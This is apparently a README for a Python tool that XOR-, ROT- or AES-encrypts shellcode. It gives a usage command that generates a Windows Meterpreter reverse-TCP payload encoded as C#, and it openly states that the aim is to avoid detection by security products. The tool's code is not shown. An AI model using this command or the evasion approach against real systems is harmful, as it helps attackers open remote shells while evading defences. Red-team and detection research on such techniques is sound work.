# py-shellcodeEnc
tool to encrypt(xor,rot,aes) shellcode

USAGE:
```
python senc.py -p windows/meterpreter/reverse_tcp -lhost eth0 -lport 443 -e rot -k 254 -f csharp
```


TODO - print cssharp decrypt function.

This is mainly for:
Avoiding getting flagged because of msfvenom builtin decoder which is a red flag for any security solution.

1 - using with a shellcode runner with decryption routine implemented.

2 - DEP with ROP decode and etc..
